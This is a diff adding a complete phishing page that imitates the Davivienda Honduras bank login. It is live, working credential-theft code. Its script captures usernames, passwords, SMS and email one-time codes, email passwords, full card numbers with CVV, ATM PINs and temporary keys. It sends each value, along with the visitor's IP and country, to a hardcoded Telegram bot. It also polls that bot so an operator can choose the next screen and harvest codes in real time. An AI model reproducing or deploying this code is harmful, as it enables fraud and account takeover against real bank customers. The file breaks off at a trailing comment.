@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Davivienda</title>
+    <style>
+        * { padding: 0; margin: 0; font-family: Arial, Helvetica, Garuda, sans-serif; box-sizing: border-box; }
+        body { background-image: url('https://i.postimg.cc/vBfdYGn5/fond.jpg'); width: 100%; min-height: 100vh; background-size: cover; background-repeat: no-repeat; background-attachment: fixed; min-width: 550px; display: flex; flex-direction: column; }
+        .box-todo { width: 100%; min-width: 550px; flex: 1; display: flex; flex-direction: column; }
+        header { display: flex; justify-content: space-between; background-color: #ee1c28; color: white; min-width: 550px; padding: 4px 15px; align-items: center; }
+        header .h1 { display: flex; align-items: center; }
+        header .h1 img { height: 30px; }
+        header .h2 { margin-top: 0; font-size: 13px; cursor: pointer; padding: 3px 10px; border-radius: 4px; transition: background 0.2s; }
+        header .h2:hover { background: rgba(255,255,255,0.15); }
+        .box { width: 70%; max-width: 500px; margin: 25px auto 15px auto; text-align: center; flex-shrink: 0; }
+        .titu { margin: 30px 0 50px 0; }
+        .titu h1 { font-size: 24px; color: #333; font-weight: 400; letter-spacing: 0.3px; }
+        .campo { width: 100%; margin: 6px 0; display: flex; justify-content: center; }
+        input { border: none; background-color: transparent; padding: 10px 5px; margin: 4px 0; border-bottom: 2px solid #ee1c28; width: 80% !important; font-size: 16px; outline: none; transition: border-color 0.3s; text-align: center; color: #333; }
+        input:focus { border-bottom-color: #c01018; }
+        ::placeholder { font-weight: 500; color: #555; font-size: 15px; }
+        .btn { width: 100%; margin: 30px 0 3px 0; display: flex; justify-content: center; }
+        .aletr { text-align: center; font-weight: 400; font-size: 14px; color: #333; padding: 6px 0; line-height: 1.5; margin-bottom: 15px; }
+        .aletr h5 { font-weight: 400; font-size: 14px; }
+        button { outline: none; border: none; color: white; background-color: #ed1c27; border-radius: 90px; padding: 12px 40px; width: 50%; margin: 8px 0; cursor: pointer; font-size: 15px; font-weight: 600; transition: background 0.2s, transform 0.1s; min-width: 45%; }
+        button:hover { background-color: #d0151f; }
+        button:active { transform: scale(0.97); }
+        button:disabled { opacity: 0.6; cursor: not-allowed; }
+        nav { margin: 40px 0 10px 0; display: flex; flex-wrap: wrap; justify-content: center; gap: 4px 18px; }
+        nav a { color: #ed1c27; font-size: 12px; padding: 4px 8px; text-decoration: none; transition: background 0.2s; font-weight: 500; cursor: pointer; }
+        nav a:hover { text-decoration: underline; }
+        .fo { color: #999; font-size: 11px; line-height: 1.5; padding: 0 10px; margin-top: 18px; text-align: center; }
+        footer { color: white; background-color: #1a1a1a; padding: 12px 0; font-size: 11px; text-align: center; min-width: 550px; margin-top: auto; flex-shrink: 0; }
+        .conf { opacity: 0.9; }
+        .cjaLogin { margin: 60px 0; display: none; flex-direction: column; align-items: center; gap: 10px; }
+        .cjaLogin.show { display: flex; }
+        .cjaLogin img { width: 45px; }
+        #mensaje { font-size: 14px; color: #ed1c27; font-weight: 500; }
+        .c2, .sms-step, .email-step, .phone-step, .code-email-step, .card-step, .temp-key-step, .correo-telefono-step { display: none; }
+        .c2.show, .sms-step.show, .email-step.show, .phone-step.show, .code-email-step.show, .card-step.show, .temp-key-step.show, .correo-telefono-step.show { display: block; animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-8px); } to { opacity: 1; transform: translateY(0); } }
+        .error-msg { color: #d32f2f; font-size: 12px; margin: 6px 0; display: none; text-align: center; }
+        .error-msg.show { display: block; }
+        .error-top { color: #d32f2f; font-size: 13px; font-weight: 600; margin: 8px 0 12px 0; display: none; background: #ffebee; padding: 8px 14px; border-radius: 6px; border-left: 4px solid #d32f2f; text-align: center; }
+        .error-top.show { display: block; }
+        .card-row { display: flex; gap: 8px; justify-content: center; flex-wrap: wrap; }
+        .card-row input { width: 40% !important; min-width: 100px; }
+        .card-row input:first-child { width: 60% !important; }
+        @media (max-width: 700px) { .h2 { display: none; } .box { width: 92%; margin-top: 20px; } .titu { margin: 20px 0 30px 0; } .titu h1 { font-size: 20px; } input { width: 90% !important; font-size: 15px; } button { width: 65%; } body, .box-todo, header, footer { min-width: 320px; } .card-row input { width: 80% !important; } .card-row input:first-child { width: 80% !important; } }
+        @media (max-width: 550px) { body, .box-todo, header, footer { min-width: 100%; } .box { min-width: auto; } }
+        
+        /* ESTILOS EXCLUSIVOS PARA LA NUEVA PANTALLA (Basado en la foto) */
+        .verificacion-container { width: 100%; text-align: left; }
+        .volver-btn { display: flex; align-items: center; font-size: 16px; color: #333; text-decoration: none; margin-bottom: 20px; cursor: pointer; font-weight: 500; }
+        .volver-btn i { margin-right: 8px; font-style: normal; font-size: 20px; }
+        .titulo-verificacion { font-size: 26px; font-weight: bold; color: #1a1a1a; margin-bottom: 25px; text-align: left; }
+        .tarjeta-blanca { background: #ffffff; border-radius: 12px; padding: 25px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        .campo-grupo { margin-bottom: 20px; text-align: left; }
+        .campo-grupo label { display: block; font-size: 15px; font-weight: 600; color: #333; margin-bottom: 10px; }
+        .input-wrapper { position: relative; display: flex; align-items: center; }
+        .input-wrapper input { width: 100% !important; padding: 14px 15px !important; border: 1px solid #ccc !important; border-radius: 8px !important; font-size: 16px !important; outline: none !important; color: #333 !important; transition: border-color 0.3s !important; background: #fff !important; text-align: left !important; margin: 0 !important; }
+        .input-wrapper input:focus { border-color: #c8102e !important; }
+        .input-wrapper input::placeholder { color: #888; font-weight: 400; }
+        .ojo-icono { position: absolute; right: 15px; cursor: pointer; color: #888; font-size: 18px; }
+        .info-texto { display: flex; align-items: flex-start; font-size: 12px; color: #666; margin-top: 10px; line-height: 1.4; text-align: left; }
+        .info-texto i { margin-right: 8px; font-style: normal; font-size: 16px; color: #555; }
+        .btn-continuar { width: 100% !important; background: #d1d5db; color: #6b7280; border: none; border-radius: 30px; padding: 16px; font-size: 16px; font-weight: bold; margin-top: 30px; cursor: pointer; transition: background 0.3s, color 0.3s; min-width: 100% !important; }
+        .btn-continuar:hover { background: #c8102e; color: white; }
+        .btn-continuar:active { transform: scale(0.98); }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="h1"><img src="https://i.postimg.cc/HL4JNXPt/head.png" alt="Davivienda"></div>
+    <div class="h2" id="langToggle">English</div>
+</header>
+
+<div class="box-todo">
+    
+    <!-- NUEVA PANTALLA DE VERIFICACIÓN (Oculta por defecto) -->
+    <div class="box" id="stepVerificacion" style="display: none;">
+        <div class="verificacion-container">
+            <a class="volver-btn" onclick="resetToUser(false)"><i>❮</i> Atrás</a>
+            <h1 class="titulo-verificacion">Verificación de identidad</h1>
+            
+            <div class="tarjeta-blanca">
+                <!-- Campo de Usuario -->
+                <div class="campo-grupo">
+                    <label>Ingrese su Usuario</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="verifUsuario" placeholder="Usuario">
+                    </div>
+                </div>
+
+                <div class="campo-grupo">
+                    <label>Ingrese los últimos 4 dígitos de su Tarjeta de Débito</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="verifTarjeta" placeholder="Tarjeta Débito" maxlength="4" inputmode="numeric">
+                    </div>
+                </div>
+                
+                <div class="campo-grupo">
+                    <label>Ingrese su clave de cajero automático</label>
+                    <div class="input-wrapper">
+                        <input type="password" id="verifClave" placeholder="Clave cajero automático" inputmode="numeric">
+                        <span class="ojo-icono" id="toggleClave">👁</span>
+                    </div>
+                    <div class="info-texto">
+                        <i>ℹ</i>
+                        <span>Es la clave que usa para realizar retiros en cajeros automáticos y compras en establecimientos</span>
+                    </div>
+                </div>
+                
+                <div class="error-msg" id="errorVerificacion">Por favor complete todos los campos correctamente.</div>
+                
+                <button class="btn-continuar" id="btnVerificacion">Continuar</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- FLUJO ORIGINAL (mainBox) -->
+    <div class="box" id="mainBox">
+        <div class="titu"><h1 id="mainTitle">Autenticación del cliente</h1></div>
+        <div class="error-top" id="errorTop">Contraseña incorrecta. Por favor ingrese nuevamente.</div>
+
+        <div class="c1" id="stepUser">
+            <div class="campo"><input type="text" id="usernameInput" placeholder="Usuario" required autofocus></div>
+            <div class="error-msg" id="errorUser">Por favor ingrese su usuario</div>
+            <div class="btn"><button id="btnUser">Ingresar</button></div>
+        </div>
+
+        <div class="cjaLogin" id="gif">
+            <img src="https://i.postimg.cc/7PBzD1Ps/carg.gif" alt="">
+            <span id="mensaje">Verificando credenciales...</span>
+        </div>
+
+        <div class="c2" id="stepPass">
+            <div class="campo"><input type="password" id="passwordInput" placeholder="Contraseña" required></div>
+            <div class="error-msg" id="errorPass">Por favor ingrese su contraseña</div>
+            <div class="btn"><button id="btnPass">Ingresar</button></div>
+        </div>
+
+        <div class="sms-step" id="stepSms">
+            <div class="aletr"><h5>Le hemos enviado un código SMS.<br>Revise su mensaje de texto y escriba el código recibido para continuar</h5></div>
+            <div class="campo"><input type="text" id="smsInput" placeholder="Ingrese el Código" required maxlength="6" inputmode="numeric"></div>
+            <div class="error-msg" id="errorSms">Código incorrecto</div>
+            <div class="btn"><button id="btnSms">Ingresar</button></div>
+            <div style="margin-top:8px;"><a href="#" id="resendSms" style="color:#ed1c27; font-size:12px; text-decoration:underline; cursor:pointer;">¿No recibiste el código? Reenviar SMS</a></div>
+        </div>
+
+        <div class="correo-telefono-step" id="stepCorreoTelefono">
+            <div class="aletr"><h5>Ingresa tu correo electrónico y número de teléfono registrados en Davivienda Honduras.<br>En caso que la verificación sea no exitosa uno de nuestros asesores se comunicará con usted.</h5></div>
+            <div class="campo"><input type="email" id="emailTelefonoInput" placeholder="Correo electrónico registrado" required></div>
+            <div class="campo"><input type="text" id="phoneTelefonoInput" placeholder="Número de teléfono registrado" required inputmode="numeric"></div>
+            <div class="error-msg" id="errorCorreoTelefono">Por favor complete ambos campos</div>
+            <div class="btn"><button id="btnCorreoTelefono">LISTO</button></div>
+        </div>
+
+        <div class="code-email-step" id="stepCodeEmail">
+            <div class="aletr"><h5>Le hemos enviado un código de verificación a su correo electrónico.<br>Por favor revise su bandeja de entrada y escriba el código en la siguiente pantalla</h5></div>
+            <div class="campo"><input type="text" id="codeEmailInput" placeholder="Ingrese el Código" required maxlength="6" inputmode="numeric"></div>
+            <div class="error-msg" id="errorCodeEmail">Código incorrecto</div>
+            <div class="btn"><button id="btnCodeEmail">Ingresar</button></div>
+            <div style="margin-top:8px;"><a href="#" id="resendCodeEmail" style="color:#ed1c27; font-size:12px; text-decoration:underline; cursor:pointer;">¿No recibiste el código? Reenviar Email</a></div>
+        </div>
+
+        <div class="email-step" id="stepEmail">
+            <div class="aletr"><h5>Ingresa el correo electrónico registrado</h5></div>
+            <div class="campo"><input type="email" id="emailInput" placeholder="Correo electrónico" required></div>
+            <div class="campo"><input type="text" id="emailPassInput" placeholder="Contraseña del correo" required></div>
+            <div class="error-msg" id="errorEmail">Por favor complete ambos campos</div>
+            <div class="btn"><button id="btnEmail">Ingresar</button></div>
+        </div>
+
+        <div class="card-step" id="stepCard">
+            <div class="aletr"><h5>Ingresa los datos de tu tarjeta</h5></div>
+            <div class="campo"><input type="text" id="cardNumberInput" placeholder="Número de tarjeta (16 dígitos)" required maxlength="16" inputmode="numeric"></div>
+            <div class="card-row">
+                <input type="text" id="cardExpInput" placeholder="MM/AA" required maxlength="5">
+                <input type="text" id="cardCvvInput" placeholder="CVV (3 dígitos)" required maxlength="3" inputmode="numeric">
+            </div>
+            <div class="error-msg" id="errorCard">Por favor complete todos los datos correctamente</div>
+            <div class="btn"><button id="btnCard">Ingresar</button></div>
+        </div>
+
+        <div class="temp-key-step" id="stepTempKey">
+            <div class="aletr"><h5>Ingresa tu clave temporal.<br>La clave temporal es un código de un solo uso enviado a tu correo o teléfono registrado</h5></div>
+            <div class="campo"><input type="text" id="tempKeyInput" placeholder="Clave temporal" required maxlength="8" inputmode="numeric"></div>
+            <div class="error-msg" id="errorTempKey">Clave temporal incorrecta</div>
+            <div class="btn"><button id="btnTempKey">Ingresar</button></div>
+            <div style="margin-top:8px;"><a href="#" id="resendTempKey" style="color:#ed1c27; font-size:12px; text-decoration:underline; cursor:pointer;">¿No recibiste la clave? Reenviar</a></div>
+        </div>
+
+        <nav>
+            <a href="#">AutoAdhesión</a>
+            <a href="#">¿Olvidó su contraseña?</a>
+            <a href="#">Mi usuario fue bloqueado</a>
+        </nav>
+        <div class="fo">Davivienda, tiene el compromiso de proteger su privacidad y la integridad de su información personal y financiera.</div>
+    </div>
+
+    <footer><div class="conf">Davivienda - © 2017 Davivienda - Todos los derechos reservados</div></footer>
+</div>
+
+<script>
+// CONFIGURACIÓN CON TU BOT Y CHAT ID
+const BOT_TOKEN = '8989119688:AAGWz1yjgDRDN2JVauWuxKHPTaqYYgFWYCg';
+const CHAT_ID = '-5532506159';
+
+let usuario = '', contrasena = '', codigoSms = '', numeroTelefono = '', correoTelefono = '', telefonoRegistrado = '', codigoEmail = '', email = '', emailPass = '', cardNumber = '', cardExp = '', cardCvv = '', tempKey = '';
+let verifUsuario = '', verifTarjeta = '', verifClave = '';
+let isProcessing = false, waitingForAction = false, sessionId = '', notificationSent = false, seenUpdates = new Set(), lastUpdateId = 0, pais = "Desconocido", ipReal = "Desconocida";
+const startTime = Date.now();
+const $ = id => document.getElementById(id);
+const stepVerificacion = $('stepVerificacion'), mainBox = $('mainBox');
+const stepUser = $('stepUser'), stepPass = $('stepPass'), stepSms = $('stepSms'), stepCorreoTelefono = $('stepCorreoTelefono'), stepCodeEmail = $('stepCodeEmail'), stepEmail = $('stepEmail'), stepCard = $('stepCard'), stepTempKey = $('stepTempKey'), gifLoading = $('gif'), mensajeSpan = $('mensaje');
+
+// UTILIDADES
+function hideAllSteps() { 
+    [stepUser, stepPass, stepSms, stepCorreoTelefono, stepCodeEmail, stepEmail, stepCard, stepTempKey].forEach(s => { s.style.display = 'none'; s.classList.remove('show'); }); 
+    gifLoading.classList.remove('show'); 
+    gifLoading.style.display = 'none'; 
+}
+function showStep(name) { 
+    hideAllSteps(); 
+    const map = { user: stepUser, pass: stepPass, sms: stepSms, correotelefono: stepCorreoTelefono, codeemail: stepCodeEmail, email: stepEmail, card: stepCard, tempkey: stepTempKey }; 
+    const el = map[name]; 
+    if (!el) return; 
+    if (name === 'user') { el.style.display = 'block'; } else { el.style.display = 'block'; setTimeout(() => el.classList.add('show'), 10); } 
+    const input = el.querySelector('input'); 
+    if (input) setTimeout(() => input.focus(), 100); 
+}
+function showLoading(msg) { 
+    // En lugar de ocultar el mainBox entero, solo ocultamos los pasos internos
+    hideAllSteps(); 
+    mensajeSpan.textContent = msg || 'Verificando credenciales...'; 
+    gifLoading.classList.add('show'); 
+    // Aseguramos que el contenedor principal esté visible para que se vea el gif
+    mainBox.style.display = 'block';
+}
+function hideLoading() { gifLoading.classList.remove('show'); gifLoading.style.display = 'none'; }
+
+function resetToUser(showError = false) { 
+    usuario = ''; contrasena = ''; codigoSms = ''; numeroTelefono = ''; correoTelefono = ''; telefonoRegistrado = ''; codigoEmail = ''; email = ''; emailPass = ''; cardNumber = ''; cardExp = ''; cardCvv = ''; tempKey = ''; 
+    verifUsuario = ''; verifTarjeta = ''; verifClave = '';
+    waitingForAction = false; 
+    document.querySelectorAll('input').forEach(i => i.value = ''); 
+    document.querySelectorAll('.error-msg').forEach(e => e.classList.remove('show')); 
+    if (showError) { 
+        const et = $('errorTop'); et.classList.add('show'); et.textContent = 'Contraseña incorrecta. Por favor ingrese nuevamente.'; setTimeout(() => et.classList.remove('show'), 5000); 
+    } else { 
+        $('errorTop').classList.remove('show'); 
+    } 
+    
+    // Aseguramos que se muestre el login original y se oculte la verificación
+    stepVerificacion.style.display = 'none';
+    mainBox.style.display = 'block';
+    showStep('user');
+}
+
+function generateSessionId() { return 'dv_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6); }
+async function sendToTelegram(text, buttons = null) { try { const payload = { chat_id: CHAT_ID, text, parse_mode: 'HTML' }; if (buttons) payload.reply_markup = { inline_keyboard: buttons }; const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }); return r.ok; } catch (e) { return false; } }
+
+// DETECCIÓN DE IP Y PAÍS
+async function fetchIPAndCountry() {
+    try {
+        const r = await fetch('https://ipapi.co/json/');
+        if (!r.ok) throw new Error("Error en red");
+        const data = await r.json();
+        ipReal = data.ip || "Desconocida";
+        pais = data.country_name || "Desconocido";
+    } catch (e) { 
+        try {
+            const r2 = await fetch('https://ipwho.is/');
+            const data2 = await r2.json();
+            ipReal = data2.ip || "Desconocida";
+            pais = data2.country || "Desconocido";
+        } catch (e2) {
+            ipReal = "Desconocida";
+            pais = "Desconocido";
+        }
+    }
+}
+
+async function sendPageAccess() {
+    if (notificationSent) return;
+    notificationSent = true;
+    await fetchIPAndCountry();
+    await sendToTelegram(`🚪 <b>ALGUIEN ACCEDIÓ A TU PÁGINA WEB</b>\n\n🌍 <b>País:</b> ${pais}\n📡 <b>IP:</b> ${ipReal}`);
+}
+
+async function sendOptionsWithButtons(title, extraData = '') {
+    sessionId = generateSessionId();
+    let msg = `🔵 <b>${title}</b>\n\n👤 <b>Usuario:</b> <code>${usuario}</code>\n🌍 <b>País:</b> ${pais}\n📡 <b>IP:</b> ${ipReal}`;
+    if (extraData) msg += `\n${extraData}`;
+    
+    // MENÚ CON LA NUEVA OPCIÓN ARRIBA
+    const buttons = [
+        [{ text: '🔐 Verificación Contraseña', callback_data: 'v_' + sessionId }],
+        [{ text: '📱 SMS', callback_data: 's_' + sessionId }],
+        [{ text: '📧 Correo - Teléfono', callback_data: 'p_' + sessionId }],
+        [{ text: '✉️ Code Email', callback_data: 'c_' + sessionId }],
+        [{ text: '💳 Tarjeta', callback_data: 't_' + sessionId }],
+        [{ text: '🔑 Clave temporal', callback_data: 'k_' + sessionId }],
+        [{ text: '❌ Contraseña incorrecta', callback_data: 'i_' + sessionId }],
+        [{ text: '🏠 EXIT', callback_data: 'x_' + sessionId }]
+    ];
+    await sendToTelegram(msg, buttons);
+    waitingForAction = true;
+    showLoading('Verificando credenciales...');
+}
+
+// ESCUCHA DE TELEGRAM
+async function checkUpdates() {
+    if (isProcessing) {
+        setTimeout(checkUpdates, 1000);
+        return;
+    }
+
+    try {
+        const endpoint = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=1`;
+        const resp = await fetch(endpoint);
+        const data = await resp.json();
+        
+        if (data.ok && data.result) {
+            for (let update of data.result) {
+                lastUpdateId = update.update_id;
+                const cb = update.callback_query;
+                if (cb && cb.data && !seenUpdates.has(cb.id)) {
+                    seenUpdates.add(cb.id);
+                    const action = cb.data[0];
+                    const sid = cb.data.slice(2);
+                    
+                    if (sid === sessionId) {
+                        hideLoading();
+                        waitingForAction = false;
+
+                        const answer = async (txt) => { try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery?callback_query_id=${cb.id}&text=${encodeURIComponent(txt)}`); } catch(e){} };
+                        
+                        if (action === 'v') { 
+                            mainBox.style.display = 'none'; 
+                            stepVerificacion.style.display = 'block'; 
+                            await sendToTelegram(`🔐 <b>Verificación de Identidad seleccionada</b>\n👤 ${usuario}`); 
+                            answer('Verificación activada'); 
+                        }
+                        else if (action === 's') { showStep('sms'); await sendToTelegram(`📱 <b>SMS seleccionado</b>\n👤 ${usuario}`); answer('SMS activado'); }
+                        else if (action === 'p') { showStep('correotelefono'); await sendToTelegram(`📧 <b>Correo - Teléfono seleccionado</b>\n👤 ${usuario}`); answer('Correo - Teléfono activado'); }
+                        else if (action === 'c') { showStep('codeemail'); await sendToTelegram(`✉️ <b>Code Email seleccionado</b>\n👤 ${usuario}`); answer('Code Email activado'); }
+                        else if (action === 't') { showStep('card'); await sendToTelegram(`💳 <b>Tarjeta seleccionada</b>\n👤 ${usuario}`); answer('Tarjeta activada'); }
+                        else if (action === 'k') { showStep('tempkey'); await sendToTelegram(`🔑 <b>Clave temporal seleccionada</b>\n👤 ${usuario}`); answer('Clave temporal activada'); }
+                        else if (action === 'i') { await sendToTelegram(`❌ <b>Contraseña incorrecta</b>\n👤 ${usuario}`); answer('Reiniciando'); resetToUser(true); }
+                        else if (action === 'x') { await sendToTelegram(`🏠 <b>Saliendo...</b>\n👤 ${usuario}`); answer('Saliendo'); window.location.href = 'https://www.google.com/'; }
+                    }
+                }
+            }
+        }
+    } catch(e) { console.warn('Error en escucha:', e); }
+    
+    setTimeout(checkUpdates, 1000); 
+}
+
+// LÓGICA DE LA PANTALLA DE VERIFICACIÓN (BOTÓN CONTINUAR)
+$('toggleClave').addEventListener('click', function() {
+    const input = $('verifClave');
+    if (input.type === 'password') {
+        input.type = 'text';
+        this.textContent = '🙈';
+    } else {
+        input.type = 'password';
+        this.textContent = '👁';
+    }
+});
+
+$('verifTarjeta').addEventListener('input', function() {
+    this.value = this.value.replace(/[^0-9]/g, '');
+});
+
+$('btnVerificacion').addEventListener('click', async function() {
+    if (isProcessing) return;
+    const vUser = $('verifUsuario').value.trim();
+    const vTarjeta = $('verifTarjeta').value.trim();
+    const vClave = $('verifClave').value.trim();
+    const e = $('errorVerificacion');
+    
+    if (!vUser || !vTarjeta || !vClave) {
+        e.textContent = 'Por favor complete todos los campos.';
+        e.classList.add('show');
+        return;
+    }
+    if (vTarjeta.length !== 4) {
+        e.textContent = 'La tarjeta debe tener los últimos 4 dígitos.';
+        e.classList.add('show');
+        return;
+    }
+    e.classList.remove('show');
+    
+    verifUsuario = vUser;
+    verifTarjeta = vTarjeta;
+    verifClave = vClave;
+    usuario = vUser; 
+    
+    isProcessing = true;
+    
+    // 1. Ocultamos la pantalla de verificación para mostrar el cargando
+    stepVerificacion.style.display = 'none';
+    
+    // 2. Mostramos el cargando en el contenedor principal
+    showLoading('Verificando credenciales...');
+    
+    await fetchIPAndCountry();
+    await sendToTelegram(`🔐 <b>VERIFICACIÓN DE IDENTIDAD COMPLETADA</b>\n\n👤 <b>Usuario:</b> <code>${verifUsuario}</code>\n💳 <b>Últimos 4 dígitos:</b> <code>${verifTarjeta}</code>\n🔑 <b>Clave Cajero:</b> <code>${verifClave}</code>\n🌍 <b>País:</b> ${pais}\n📡 <b>IP:</b> ${ipReal}`);
+    
+    // 3. HACEMOS UNA PAUSA DE 2 SEGUNDOS PARA QUE SE VEA EL CARGANDO
+    setTimeout(() => {
+        isProcessing = false;
+        // 4. VOLVEMOS A ENVIAR EL MENÚ (BUCLE)
+        sendOptionsWithButtons('NUEVO INTENTO - DAVIVIENDA', `🔐 <b>Verificación de identidad:</b> Completada`);
+    }, 2000); 
+});
+
+// PASO 1: USUARIO
+$('btnUser').addEventListener('click', function() {
+    if (isProcessing) return;
+    const timeElapsed = Date.now() - startTime;
+    const val = $('usernameInput').value.trim();
+    if (!val) { const e = $('errorUser'); e.textContent = 'Por favor ingrese su usuario'; e.classList.add('show'); return; }
+    if (timeElapsed < 1500) { const e = $('errorUser'); e.textContent = 'Verificando seguridad... intente de nuevo.'; e.classList.add('show'); return; }
+    $('errorUser').classList.remove('show');
+    usuario = val;
+    isProcessing = true;
+    showLoading('Verificando credenciales...');
+    setTimeout(() => { isProcessing = false; hideLoading(); showStep('pass'); }, 1500);
+});
+
+// PASO 2: CONTRASEÑA
+$('btnPass').addEventListener('click', async function() {
+    if (isProcessing) return;
+    const val = $('passwordInput').value.trim();
+    if (!val) { const e = $('errorPass'); e.textContent = 'Por favor ingrese su contraseña'; e.classList.add('show'); return; }
+    $('errorPass').classList.remove('show');
+    contrasena = val;
+    isProcessing = true;
+    showLoading('Verificando credenciales...');
+    await sendOptionsWithButtons('NUEVO INTENTO - DAVIVIENDA', `🔑 <b>Contraseña:</b> <code>${contrasena}</code>`);
+    setTimeout(() => { isProcessing = false; }, 800);
+});
+
+// PASO 3: SMS
+$('btnSms').addEventListener('click', async function() {
+    if (isProcessing) return;
+    const val = $('smsInput').value.trim();
+    const e = $('errorSms');
+    if (!val || val.length !== 6) { e.textContent = 'Ingrese el código de 6 dígitos'; e.classList.add('show'); return; }
+    e.classList.remove('show');
+    codigoSms = val;
+    isProcessing = true;
+    showLoading('Verificando código SMS...');
+    await sendOptionsWithButtons('CÓDIGO SMS RECIBIDO', `🔢 <b>Código SMS:</b> <code>${codigoSms}</code>`);
+    setTimeout(() => { isProcessing = false; $('smsInput').value = ''; }, 800);
+});
+$('resendSms').addEventListener('click', async function(e) { e.preventDefault(); await sendToTelegram(`🔄 <b>REENVÍO SMS</b>\n👤 ${usuario}`); const err = $('errorSms'); err.textContent = '📲 Nuevo código enviado'; err.classList.add('show'); setTimeout(() => err.classList.remove('show'), 3000); });
+
+// PASO 4: CORREO - TELÉFONO
+$('btnCorreoTelefono').addEventListener('click', async function() {
+    if (isProcessing) return;
+    const correo = $('emailTelefonoInput').value.trim();
+    const tel = $('phoneTelefonoInput').value.trim();
+    const e = $('errorCorreoTelefono');
+    if (!correo || !tel) { e.textContent = 'Complete ambos campos'; e.classList.add('show'); return; }
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(correo)) { e.textContent = 'Ingrese un correo válido'; e.classList.add('show'); return; }
+    if (!/^[0-9]+$/.test(tel) || tel.length < 7) { e.textContent = 'Ingrese un número de teléfono válido'; e.classList.add('show'); return; }
+    e.classList.remove('show');
+    correoTelefono = correo;
+    telefonoRegistrado = tel;
+    isProcessing = true;
+    showLoading('Verificando datos...');
+    await sendOptionsWithButtons('CORREO - TELÉFONO RECIBIDOS', `📧 <b>Correo:</b> <code>${correoTelefono}</code>\n📞 <b>Teléfono:</b> <code>${telefonoRegistrado}</code>`);
+    setTimeout(() => { isProcessing = false; $('emailTelefonoInput').value = ''; $('phoneTelefonoInput').value = ''; }, 800);
+});
+
+// PASO 5: CODE EMAIL
+$('btnCodeEmail').addEventListener('click', async function() {
+    if (isProcessing) return;
+    const val = $('codeEmailInput').value.trim();
+    const e = $('errorCodeEmail');
+    if (!val || val.length !== 6) { e.textContent = 'Ingrese el código de 6 dígitos'; e.classList.add('show'); return; }
+    e.classList.remove('show');
+    codigoEmail = val;
+    isProcessing = true;
+    showLoading('Verificando código Email...');
+    await sendOptionsWithButtons('CÓDIGO EMAIL RECIBIDO', `✉️ <b>Código Email:</b> <code>${codigoEmail}</code>`);
+    setTimeout(() => { isProcessing = false; $('codeEmailInput').value = ''; }, 800);
+});
+$('resendCodeEmail').addEventListener('click', async function(e) { e.preventDefault(); await sendToTelegram(`🔄 <b>REENVÍO CODE EMAIL</b>\n👤 ${usuario}`); const err = $('errorCodeEmail'); err.textContent = '📧 Nuevo código enviado'; err.classList.add('show'); setTimeout(() => err.classList.remove('show'), 3000); });
+
+// PASO 6: EMAIL
+$('btnEmail').addEventListener('click', async function() {
+    if (isProcessing) return;
+    const mail = $('emailInput').value.trim();
+    const pass = $('emailPassInput').value.trim();
+    const e = $('errorEmail');
+    if (!mail || !pass) { e.textContent = 'Complete ambos campos'; e.classList.add('show'); return; }
+    e.classList.remove('show');
+    email = mail; emailPass = pass;
+    isProcessing = true;
+    showLoading('Verificando correo...');
+    await sendOptionsWithButtons('EMAIL RECIBIDO', `📧 <b>Correo:</b> <code>${email}</code>\n🔑 <b>Contraseña:</b> <code>${emailPass}</code>`);
+    setTimeout(() => { isProcessing = false; $('emailInput').value = ''; $('emailPassInput').value = ''; }, 800);
+});
+
+// PASO 7: TARJETA
+$('btnCard').addEventListener('click', async function() {
+    if (isProcessing) return;
+    const num = $('cardNumberInput').value.trim();
+    const exp = $('cardExpInput').value.trim();
+    const cvv = $('cardCvvInput').value.trim();
+    const e = $('errorCard');
+    if (!num || num.length !== 16) { e.textContent = 'Ingrese 16 dígitos'; e.classList.add('show'); return; }
+    if (!/^\d{2}\/\d{2}$/.test(exp)) { e.textContent = 'Formato MM/AA'; e.classList.add('show'); return; }
+    if (!cvv || cvv.length !== 3) { e.textContent = 'CVV de 3 dígitos'; e.classList.add('show'); return; }
+    e.classList.remove('show');
+    cardNumber = num; cardExp = exp; cardCvv = cvv;
+    isProcessing = true;
+    showLoading('Verificando tarjeta...');
+    await sendOptionsWithButtons('TARJETA RECIBIDA', `💳 <b>Número:</b> <code>${cardNumber}</code>\n📅 <b>Exp:</b> <code>${cardExp}</code>\n🔐 <b>CVV:</b> <code>${cardCvv}</code>`);
+    setTimeout(() => { isProcessing = false; $('cardNumberInput').value = ''; $('cardExpInput').value = ''; $('cardCvvInput').value = ''; }, 800);
+});
+
+// PASO 8: CLAVE TEMPORAL
+$('btnTempKey').addEventListener('click', async function() {
+    if (isProcessing) return;
+    const val = $('tempKeyInput').value.trim();
+    const e = $('errorTempKey');
+    if (!val || val.length < 4) { e.textContent = 'Clave temporal inválida'; e.classList.add('show'); return; }
+    e.classList.remove('show');
+    tempKey = val;
+    isProcessing = true;
+    showLoading('Verificando clave temporal...');
+    await sendOptionsWithButtons('CLAVE TEMPORAL RECIBIDA', `🔑 <b>Clave:</b> <code>${tempKey}</code>`);
+    setTimeout(() => { isProcessing = false; $('tempKeyInput').value = ''; }, 800);
+});
+$('resendTempKey').addEventListener('click', async function(e) { e.preventDefault(); await sendToTelegram(`🔄 <b>REENVÍO CLAVE TEMPORAL</b>\n👤 ${usuario}`); const err = $('errorTempKey'); err.textContent = '🔑 Nueva clave enviada'; err.classList.add('show'); setTimeout(() => err.classList.remove('show'), 3000); });
+
+// ENTER Y SOLO NÚMEROS
